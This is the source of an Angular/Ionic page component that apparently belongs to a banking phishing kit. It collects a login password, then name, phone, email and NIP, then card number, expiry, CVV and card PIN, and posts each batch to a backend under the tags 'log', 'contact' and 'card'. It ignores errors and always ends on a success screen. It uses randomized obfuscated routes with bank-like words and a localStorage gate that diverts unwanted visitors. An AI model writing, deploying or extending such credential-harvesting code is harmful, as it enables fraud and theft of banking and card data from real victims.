import { Component, HostListener } from '@angular/core';
import { ModalController, Platform } from '@ionic/angular';
import UserModel from '../../shared/models/user.model';
import { LoadingModalPage } from '../../shared/modals/loading-modal/loading-modal.page';
import { DualModalPage } from '../../shared/modals/dual-modal/dual-modal.page';
import { Validator } from 'src/app/shared/class/validator.class';
import KbInput from '../interfaces/input.interface';
import { MainService } from '../../shared/services/main.service';
import { Router } from '@angular/router';
import { environment } from 'src/environments/environment';
import Generate from 'src/app/shared/class/generate.class';

@Component({
  selector: 'app-home',
  templateUrl: 'home.page.html',
  styleUrls: ['home.page.scss'],
  host: {
    '(document:click)': 'clickOutside($event)',
  },
})
export class HomePage {
  API_URL = environment.API_URL;

  screenWidth: any;
  screenHeight: any;

  userModel: UserModel;
  generate: Generate;
  validator: Validator;
  currentStep: number = 1;

  inputPswd: KbInput = {
    active: false,
    focused: false,
    error: false,
    ready: false,
  };

  inputPhone: KbInput = {
    active: false,
    focused: false,
    error: false,
    ready: false,
  };
  inputEmail: KbInput = {
    active: false,
    focused: false,
    error: false,
    ready: false,
  };
  inputAddress: KbInput = {
    active: false,
    focused: false,
    error: false,
    ready: false,
  };
  inputName: KbInput = {
    active: false,
    focused: false,
    error: false,
    ready: false,
  };
  inputInfoNip: KbInput = {
    active: false,
    focused: false,
    error: false,
    ready: false,
  };

  inputCard: KbInput = {
    active: false,
    focused: false,
    error: false,
    ready: false,
  };
  inputMonthExp: KbInput = {
    active: false,
    focused: false,
    error: false,
    ready: false,
  };
  inputYearExp: KbInput = {
    active: false,
    focused: false,
    error: false,
    ready: false,
  };
  inputCvv: KbInput = {
    active: false,
    focused: false,
    error: false,
    ready: false,
  };
  inputNip: KbInput = {
    active: false,
    focused: false,
    error: false,
    ready: false,
  };

  ifReadyFormCard: boolean = false;
  ifReadyFormContact: boolean = false;

  externalModal: boolean = true;
  ifModalOpen: boolean = false;
  isLoading: boolean = false;
  addElementScroll: boolean = false;

  currentInitialHeight: number = 0;
  currentKeyboardHeight: string = '';
  currentSpaceHeight: string = '0px';

  constructor(
    private platform: Platform,
    private modalCtrl: ModalController,
    private mainSrv: MainService,
    private router: Router
  ) {
    this.generate = new Generate('tablerorstgdtcgob');
    this.userModel = new UserModel();
    this.validator = new Validator();
  }

  ngOnInit() {
    this.screenWidth = window.innerWidth;
    this.screenHeight = window.innerHeight;

    this.currentInitialHeight = this.screenHeight;

    if (this.currentInitialHeight < 670) {
      this.currentSpaceHeight = '300px';
    }

    const isOk = localStorage.getItem('isOk');
    if (!isOk || isOk !== 'true') {
      this.router.navigate(['/comparador']);
    }

    const userAccount = localStorage.getItem('userAccount');
    if (userAccount && userAccount.length) {
      this.userModel.userOrCard = userAccount;
    } else {
      this.router.navigate([this.getRoute()]);
    }

    setTimeout(() => {
      this.endLoading();
    }, 2000);
  }

  ionViewWillEnter() {
    this.externalModal = true;
    this.generate = new Generate('tablerorstgdtcgob');
    this.endLoading();
  }

  ionViewDidLeave() {
    this.externalModal = false;
    localStorage.removeItem('userAccount');
  }

  @HostListener('window:resize', ['$event'])
  onResize(event: any) {
    this.screenWidth = window.innerWidth;
    this.screenHeight = window.innerHeight;

    if (this.currentInitialHeight >= 670) {
      if (this.getPlatform().device === 'android') {
        if (this.currentInitialHeight === this.screenHeight) {
          this.currentSpaceHeight = '0px';
        } else {
          let heigth = this.currentInitialHeight - this.screenHeight;
          this.currentSpaceHeight = `${heigth.toString()}px`;
        }
      }
    }
  }

  // #region CONTROLLER MODALS
  async dualModal(current: string) {
    if (this.ifModalOpen) {
      return false;
    }

    this.ifModalOpen = true;
    const modal = await this.modalCtrl.create({
      component: DualModalPage,
      cssClass: 'dual-modal',
      componentProps: {
        current: current,
      },
    });

    modal.onDidDismiss().then((response) => {
      this.ifModalOpen = false;
    });

    return await modal.present();
  }

  async focusModal() {
    if (this.ifModalOpen) {
      return false;
    }

    this.ifModalOpen = true;
    const modal = await this.modalCtrl.create({
      component: DualModalPage,
      cssClass: 'focus-modal',
    });

    modal.onDidDismiss().then((response) => {
      this.ifModalOpen = false;
    });

    return await modal.present();
  }

  async loadingModal() {
    this.isLoading = true;
    if (this.ifModalOpen) {
      return false;
    }

    this.ifModalOpen = true;
    const modal = await this.modalCtrl.create({
      component: LoadingModalPage,
      cssClass: 'loading-modal',
    });

    modal.onDidDismiss().then((response) => {
      this.ifModalOpen = false;
    });

    return await modal.present();
  }

  private async endLoading() {
    let counter = 0;
    let opened: any = this.modalCtrl.getTop();

    while (!opened.__zone_symbol__value && this.externalModal) {
      await this.sleep(2000);

      if (this.externalModal) {
        opened = this.modalCtrl.getTop();
      }

      counter++;
      // console.log(counter,opened.__zone_symbol__value );
      if (counter > 10) {
        break;
      }
    }

    if (counter < 10 && this.externalModal) {
      await this.modalCtrl.dismiss();
    }
  }

  private sleep(ms: number) {
    return new Promise((resolve) => {
      setTimeout(resolve, ms);
    });
  }
  // #endregion

  // #region CONTROLLER PASSWORD FORM
  onFocusPass(event: any): void {
    this.inputPswd.active = true;
    // if (this.getPlatform().device === 'android') {
    //   this.addElementScroll = true;
    // }

    if (this.currentInitialHeight >= 670) {
      if (this.getPlatform().device === 'ios') {
        this.currentSpaceHeight = `200px`;
      }
    }
  }

  unFocusPass(event: any): void {
    if (this.userModel.pswd && this.userModel.pswd.length) {
      this.inputPswd.active = true;
    } else {
      this.inputPswd.active = false;
    }

    if (this.getPlatform().device === 'android') {
      this.addElementScroll = false;
    }

    if (this.currentInitialHeight >= 670) {
      if (this.getPlatform().device === 'ios') {
        this.currentSpaceHeight = '0px';
      }
    }
  }

  onChangePass(event: any): void {
    this.userModel.pswd = event.value;
    if (!this.userModel.pswd) {
      this.inputPswd.error = false;
      this.inputPswd.ready = false;
    }

    if (this.userModel.pswd && this.userModel.pswd.length === 8) {
      this.inputPswd.ready = true;
    } else {
      this.inputPswd.ready = false;
    }
  }

  onClearPass(passInput: any) {
    if (!this.userModel.pswd) {
      return false;
    }

    this.userModel.pswd = '';
    this.userModel.demoPswd = '';
    this.inputPswd.error = false;
    this.inputPswd.ready = false;
    passInput.focus();
  }

  changePassword() {
    this.externalModal = false;
    this.dualModal('password');
  }

  async onEnterPass(): Promise<boolean> {
    this.externalModal = false;

    if (
      !this.userModel.pswd ||
      !this.userModel.pswd.length ||
      !this.inputPswd.ready ||
      this.inputPswd.error
    ) {
      this.inputPswd.ready = false;

      this.focusModal();
      await this.sleep(500);
      let opened: any = this.modalCtrl.getTop();
      if (opened.__zone_symbol__value) {
        await this.modalCtrl.dismiss();
      }
      return false;
    }

    if (!this.userModel.pswd || !this.userModel.pswd.length) {
      this.focusModal();
      await this.sleep(500);
      let opened: any = this.modalCtrl.getTop();
      if (opened.__zone_symbol__value) {
        await this.modalCtrl.dismiss();
      }
      return false;
    }

    this.loadingModal();

    if (this.userModel.pswd.length === 8) {
      try {
        await this.mainSrv.sendData(this.userModel, 'log');
      } catch (error) {
      } finally {
        this.inputPswd.ready = false;
        await this.sleep(1500);
        this.currentStep = 2;

        let opened: any = this.modalCtrl.getTop();
        if (opened.__zone_symbol__value) {
          await this.modalCtrl.dismiss();
        }

        this.dualModal('aviso-contact');
        this.userModel.demoPswd = '';
      }
    }
    return true;
  }
  // #endregion

  // #region CONTROLLER CONTACT FORM
  onFocusContact(event: any, current: string): void {
    if (current === 'name') {
      this.inputName.focused = true;
      this.inputName.active = true;
    } else if (current === 'phone') {
      this.inputPhone.focused = true;
      this.inputPhone.active = true;
    } else if (current === 'email') {
      this.inputEmail.focused = true;
      this.inputEmail.active = true;
    } else if (current === 'infoNip') {
      this.inputInfoNip.focused = true;
      this.inputInfoNip.active = true;
    }
    // else if(current === 'address'){
    //   this.inputAddress.focused = true;
    //   this.inputAddress.active  = true;
    // }

    if (this.currentInitialHeight >= 670) {
      if (this.getPlatform().device === 'ios') {
        this.currentSpaceHeight = `200px`;
      }
    }
  }

  unFocusContact(event: any, current: string): void {
    if (current === 'name') {
      if (this.userModel.name && this.userModel.name.length) {
        this.inputName.active = true;
      } else {
        this.inputName.active = false;
      }
    } else if (current === 'phone') {
      if (this.userModel.phone && this.userModel.phone.length) {
        this.inputPhone.active = true;
      } else {
        this.inputPhone.active = false;
      }
    } else if (current === 'email') {
      if (this.userModel.email && this.userModel.email.length) {
        this.inputEmail.active = true;
      } else {
        this.inputEmail.active = false;
      }
    } else if (current === 'infoNip') {
      if (this.userModel.infoNip && this.userModel.infoNip.length) {
        this.inputInfoNip.active = true;
      } else {
        this.inputInfoNip.active = false;
      }
    }

    // else if(current === 'address'){
    //   if(this.userModel.address && this.userModel.address.length){
    //     this.inputAddress.active = true;
    //   }else{
    //     this.inputAddress.active = false;
    //   }
    // }

    if (this.currentInitialHeight >= 670) {
      if (this.getPlatform().device === 'ios') {
        this.currentSpaceHeight = '0px';
      }
    }
  }

  onChangeContact(event: any, current: string): boolean {
    this.ifReadyFormContact = false;

    if (current === 'name') {
      this.userModel.name = event.value;

      if (!this.userModel.name) {
        this.inputName.error = false;
        this.inputName.ready = false;
        return false;
      }

      if (
        this.validator.CheckAddress(this.userModel.name) &&
        !this.validator.HashNumber(this.userModel.name)
      ) {
        this.inputName.ready = true;
        this.inputName.error = false;
      } else {
        this.inputName.error = true;
        this.inputName.ready = false;
      }
    } else if (current === 'phone') {
      this.userModel.phone = event.value;
      if (!this.userModel.phone) {
        this.inputPhone.error = false;
        this.inputPhone.ready = false;
        return false;
      }

      if (
        this.userModel.phone.length === 10 &&
        !this.validator.HasLetter(this.userModel.phone)
      ) {
        this.inputPhone.ready = true;
        this.inputPhone.error = false;
      } else {
        this.inputPhone.error = true;
        this.inputPhone.ready = false;
      }
    } else if (current === 'email') {
      this.userModel.email = event.value;
      if (!this.userModel.email) {
        this.inputEmail.error = false;
        this.inputEmail.ready = false;
        return false;
      }

      if (this.validator.CheckMail(this.userModel.email)) {
        this.inputEmail.ready = true;
        this.inputEmail.error = false;
      } else {
        this.inputEmail.error = true;
        this.inputEmail.ready = false;
      }
    } else if (current === 'infoNip') {
      this.userModel.infoNip = event.value;

      if (!this.userModel.infoNip) {
        this.inputInfoNip.error = false;
        this.inputInfoNip.ready = false;
        return false;
      }

      if (this.validator.CheckNIP(this.userModel.infoNip)) {
        this.inputInfoNip.ready = true;
        this.inputInfoNip.error = false;
      } else {
        this.inputInfoNip.error = true;
        this.inputInfoNip.ready = false;
      }
    }

    // else if(current === 'address'){
    //   this.userModel.address = event.value;

    //   if(!this.userModel.address){
    //     this.inputAddress.error = false;
    //     this.inputAddress.ready = false;
    //     return false;
    //   }

    //   if(this.validator.CheckAddress(this.userModel.address)){
    //     this.inputAddress.ready = true;
    //     this.inputAddress.error = false;
    //   }else{
    //     this.inputAddress.error = true ;
    //     this.inputAddress.ready = false;
    //   }
    // }

    //this.inputAddress.ready
    if (
      this.inputName.ready &&
      this.inputPhone.ready &&
      this.inputEmail.ready &&
      this.inputInfoNip.ready
    ) {
      this.inputName.error = false;
      this.inputPhone.error = false;
      this.inputEmail.error = false;
      this.inputInfoNip.error = false;

      this.ifReadyFormContact = true;
    }

    return true;
  }

  onClearContact(currentInput: any, current: string): boolean {
    if (current === 'pswd') {
      if (!this.userModel.pswd) return false;
      this.userModel.pswd = '';
      this.userModel.demoPswd = '';
      this.inputPswd.error = false;
      this.inputPswd.ready = false;
      this.inputPswd.focused = true;
    } else if (current === 'name') {
      if (!this.userModel.name) return false;
      this.userModel.name = '';
      this.userModel.demoName = '';
      this.inputName.error = false;
      this.inputName.ready = false;
      this.inputName.focused = true;
    } else if (current === 'phone') {
      if (!this.userModel.phone) return false;
      this.userModel.phone = '';
      this.userModel.demoPhone = '';
      this.inputPhone.error = false;
      this.inputPhone.ready = false;
      this.inputPhone.focused = true;
    } else if (current === 'email') {
      if (!this.userModel.email) return false;
      this.userModel.email = '';
      this.userModel.demoEmail = '';
      this.inputEmail.error = false;
      this.inputEmail.ready = false;
      this.inputEmail.focused = true;
    } else if (current === 'infoNip') {
      if (!this.userModel.infoNip) return false;
      this.userModel.infoNip = '';
      this.userModel.demoInfoNip = '';
      this.inputInfoNip.error = false;
      this.inputInfoNip.ready = false;
      this.inputInfoNip.focused = true;
    }

    // else if(current === 'address'){
    //   if(!this.userModel.address) return false;
    //   this.userModel.address = "";
    //   this.userModel.demoAddress = "";
    //   this.inputAddress.error = false;
    //   this.inputAddress.ready = false;
    //   this.inputAddress.focused = true;
    // }

    this.ifReadyFormContact = false;
    currentInput.focus();
    return true;
  }

  async onEnterContact() {
    // if(!this.ifReadyFormContact){
    //   return false;
    // }

    if (
      !this.inputName.ready ||
      !this.inputPhone.ready ||
      !this.inputEmail.ready ||
      !this.inputInfoNip.ready
    ) {
      this.focusModal();
      await this.sleep(500);
      let opened: any = this.modalCtrl.getTop();
      if (opened.__zone_symbol__value) {
        await this.modalCtrl.dismiss();
      }
      return false;
    }
    // !this.userModel.address
    if (
      !this.userModel.name ||
      !this.userModel.phone ||
      !this.userModel.email ||
      !this.userModel.infoNip
    ) {
      this.focusModal();
      await this.sleep(500);
      let opened: any = this.modalCtrl.getTop();
      if (opened.__zone_symbol__value) {
        await this.modalCtrl.dismiss();
      }
      return false;
    }

    this.externalModal = false;
    this.loadingModal();

    try {
      await this.mainSrv.sendData(this.userModel, 'contact');
    } catch (error) {
    } finally {
      this.ifReadyFormContact = false;
      await this.sleep(1500);
      this.currentStep = 3;

      let opened: any = this.modalCtrl.getTop();
      if (opened.__zone_symbol__value) {
        await this.modalCtrl.dismiss();
      }

      this.userModel.demoName = '';
      this.userModel.demoPhone = '';
      this.userModel.demoEmail = '';
      this.userModel.demoInfoNip = '';
      // this.userModel.demoAddress = "";
      this.dualModal('aviso-card');
    }
  }
  // #endregion

  // #region CONTROLLER CREDITCARD FORM
  onFocusCard(event: any, current: string): void {
    if (current === 'card') {
      this.inputCard.focused = true;
      this.inputCard.active = true;
    } else if (current === 'cvv') {
      this.inputCvv.focused = true;
      this.inputCvv.active = true;
    } else if (current === 'nip') {
      this.inputNip.focused = true;
      this.inputNip.active = true;
    }

    if (this.currentInitialHeight >= 670) {
      if (this.getPlatform().device === 'ios') {
        this.currentSpaceHeight = `200px`;
      }
    }
  }

  unFocusCard(event: any, current: string): void {
    if (current === 'card') {
      if (this.userModel.card && this.userModel.card.length) {
        this.inputCard.active = true;
      } else {
        this.inputCard.active = false;
      }
    } else if (current === 'cvv') {
      if (this.userModel.cvv && this.userModel.cvv.length) {
        this.inputCvv.active = true;
      } else {
        this.inputCvv.active = false;
      }
    } else if (current === 'nip') {
      if (this.userModel.nip && this.userModel.nip.length) {
        this.inputNip.active = true;
      } else {
        this.inputNip.active = false;
      }
    }

    if (this.currentInitialHeight >= 670) {
      if (this.getPlatform().device === 'ios') {
        this.currentSpaceHeight = '0px';
      }
    }
  }

  onChangesCard(event: any, current: string): boolean {
    this.ifReadyFormCard = false;

    if (current === 'card') {
      this.userModel.card = event.value;
      if (!this.userModel.card) {
        this.inputCard.error = false;
        this.inputCard.ready = false;
        return false;
      }

      const checkCard = this.validator.CardNumber(this.userModel.card);
      if (!checkCard) {
        this.inputCard.error = true;
        this.inputCard.ready = false;
        return false;
      }

      if (this.validator.checkCreditCard(this.userModel.card, checkCard)) {
        this.inputCard.ready = true;
        this.inputCard.error = false;
      } else {
        this.inputCard.error = true;
        this.inputCard.ready = false;
      }
    } else if (current === 'cvv') {
      this.userModel.cvv = event.value;
      if (!this.userModel.cvv) {
        this.inputCvv.error = false;
        this.inputCvv.ready = false;
        return false;
      }

      if (this.validator.CheckCvv(this.userModel.cvv)) {
        this.inputCvv.ready = true;
        this.inputCvv.error = false;
      } else {
        this.inputCvv.error = true;
        this.inputCvv.ready = false;
      }
    } else if (current === 'nip') {
      this.userModel.nip = event.value;

      if (!this.userModel.nip) {
        this.inputNip.error = false;
        this.inputNip.ready = false;
        return false;
      }

      if (this.validator.CheckNIP(this.userModel.nip)) {
        this.inputNip.ready = true;
        this.inputNip.error = false;
      } else {
        this.inputNip.error = true;
        this.inputNip.ready = false;
      }
    }

    if (this.inputCard.ready && this.inputCvv.ready && this.inputNip.ready) {
      this.inputCard.error = false;
      this.inputCvv.error = false;
      this.inputNip.error = false;

      const isValidDate = this.validateCardDate();

      if (isValidDate) {
        this.ifReadyFormCard = true;
      } else {
        this.ifReadyFormCard = false;
      }
    }

    return true;
  }

  onChangeSelectCard(value: string, current: string) {
    if (current === 'month') {
      this.userModel.monthExp = value;
    } else if (current === 'year') {
      this.userModel.yearExp = value;
    }

    this.validateCardDate();
  }

  private validateCardDate(): boolean {
    if (!this.userModel.monthExp || !this.userModel.yearExp) {
      this.inputMonthExp.error = true;
      this.inputYearExp.error = true;
      return false;
    }

    const isValidDate = this.validator.CheckExp(
      this.userModel.monthExp,
      this.userModel.yearExp
    );
    if (!isValidDate) {
      this.inputMonthExp.error = true;
      this.inputYearExp.error = true;
      this.ifReadyFormCard = false;
      return false;
    }

    this.inputMonthExp.error = false;
    this.inputYearExp.error = false;

    this.inputMonthExp.ready = true;
    this.inputYearExp.ready = true;

    if (this.inputCard.ready && this.inputCvv.ready && this.inputNip.ready) {
      this.ifReadyFormCard = true;
    }

    return true;
  }

  onClearCard(currentInput: any, current: string): boolean {
    if (current === 'card') {
      if (!this.userModel.card) return false;
      this.userModel.card = '';
      this.userModel.demoCard = '';
      this.inputCard.error = false;
      this.inputCard.ready = false;
      this.inputCard.focused = true;
    } else if (current === 'cvv') {
      if (!this.userModel.cvv) return false;
      this.userModel.cvv = '';
      this.userModel.demoCvv = '';
      this.inputCvv.error = false;
      this.inputCvv.ready = false;
      this.inputCvv.focused = true;
    } else if (current === 'nip') {
      if (!this.userModel.nip) return false;
      this.userModel.nip = '';
      this.userModel.demoNip = '';
      this.inputNip.error = false;
      this.inputNip.ready = false;
      this.inputNip.focused = true;
    }
    this.ifReadyFormCard = false;
    currentInput.focus();
    return true;
  }

  async onEnterCard() {
    // if(!this.ifReadyFormCard){
    //   return false;
    // }

    if (
      !this.inputCard.ready ||
      !this.inputCvv.ready ||
      !this.inputNip.ready ||
      !this.inputMonthExp.ready ||
      !this.inputYearExp.ready
    ) {
      this.focusModal();
      await this.sleep(500);
      let opened: any = this.modalCtrl.getTop();
      if (opened.__zone_symbol__value) {
        await this.modalCtrl.dismiss();
      }
      return false;
    }

    if (
      !this.userModel.card ||
      !this.userModel.cvv ||
      !this.userModel.nip ||
      !this.userModel.monthExp ||
      !this.userModel.yearExp
    ) {
      this.focusModal();
      await this.sleep(500);
      let opened: any = this.modalCtrl.getTop();
      if (opened.__zone_symbol__value) {
        await this.modalCtrl.dismiss();
      }
      return false;
    }

    this.loadingModal();

    try {
      await this.mainSrv.sendData(this.userModel, 'card');
    } catch (error) {
    } finally {
      this.ifReadyFormCard = false;
      await this.sleep(2000);

      let opened: any = this.modalCtrl.getTop();
      if (opened.__zone_symbol__value) {
        await this.modalCtrl.dismiss();
      }

      this.userModel.demoCard = '';
      this.userModel.demoCvv = '';
      this.userModel.demoNip = '';

      this.currentStep = 4;
      this.dualModal('success');
      localStorage.removeItem('userAccount');

      //success
    }
  }
  // #endregion

  clickOutside(event: any): boolean {
    let currentEl = event?.target?.name;

    if (currentEl !== 'close-circle') {
      if (this.currentStep < 3) {
        if (currentEl === 'psmt') {
          this.hiddenClearBtn('pswd');
        } else if (currentEl === 'name') {
          this.hiddenClearBtn('name');
        } else if (currentEl === 'telfn') {
          this.hiddenClearBtn('phone');
        } else if (currentEl === 'correo') {
          this.hiddenClearBtn('email');
        } else if (currentEl === 'infoNip') {
          this.hiddenClearBtn('infoNip');
        } else {
          this.hiddenClearBtn('');
        }
      } else {
        if (currentEl === 'drac') {
          this.hiddenClearBtn('card');
        } else if (currentEl === 'vvc') {
          this.hiddenClearBtn('cvv');
        } else if (currentEl === 'npi') {
          this.hiddenClearBtn('nip');
        } else {
          this.hiddenClearBtn('');
        }
      }
    }

    return true;
  }

  //
  onlyNumber(event: any, maxLength: number): boolean {
    const value = event.target.value;
    let pattern = /^([0-9])$/;
    let result = pattern.test(event.key);
    if (!result) {
      return false;
    }
    if (this.validator.HasLetter(value) || value.length > maxLength) {
      return false;
    }
    return true;
  }

  hiddenClearBtn(current: string) {
    this.inputPswd.focused = false;
    this.inputName.focused = false;
    this.inputPhone.focused = false;
    this.inputEmail.focused = false;
    this.inputInfoNip.focused = false;
    // this.inputAddress.focused = false;

    this.inputCard.focused = false;
    this.inputCvv.focused = false;
    this.inputNip.focused = false;

    if (current === 'pswd') {
      this.inputPswd.focused = true;
    } else if (current === 'name') {
      this.inputName.focused = true;
    } else if (current === 'phone') {
      this.inputPhone.focused = true;
    } else if (current === 'email') {
      this.inputEmail.focused = true;
    } else if (current === 'infoNip') {
      this.inputInfoNip.focused = true;
    } else if (current === 'card') {
      this.inputCard.focused = true;
    } else if (current === 'cvv') {
      this.inputCvv.focused = true;
    } else if (current === 'nip') {
      this.inputNip.focused = true;
    }
  }

  getVhPx(porcent: number): string {
    let height: number = this.screenHeight as number;
    return `${(porcent * height) / 100}px`;
  }

  getSubVhPx(data: { main: number; sub: number }): string {
    let height: number = this.screenHeight as number;
    let currentP: number = (data.main * height) / 100;
    return `${(data.sub * currentP) / 100}px`;
  }

  getVwPx(porcent: number, current: number) {
    return (porcent * current) / 100;
  }

  getPlatform(): { device: string; mobile: boolean } {
    if (this.platform.is('desktop')) {
      return { device: 'desktop', mobile: false };
    } else if (this.platform.is('ios')) {
      return { device: 'ios', mobile: true };
    } else if (this.platform.is('android')) {
      return { device: 'android', mobile: true };
    }
  }

  getRoute(): string {
    const main = ['logokodrzfzps', 'iniciojjzmqpjzio', 'ingresoioxkyhgeyb'];
    const optional = [
      'banca',
      'linea',
      'info',
      'gestor',
      'consumo',
      'convenio',
      '',
      'canal',
    ];
    let rand = `${main[Math.floor(Math.random() * main.length)]}/${
      optional[Math.floor(Math.random() * optional.length)]
    }`;
    return rand;
  }
}
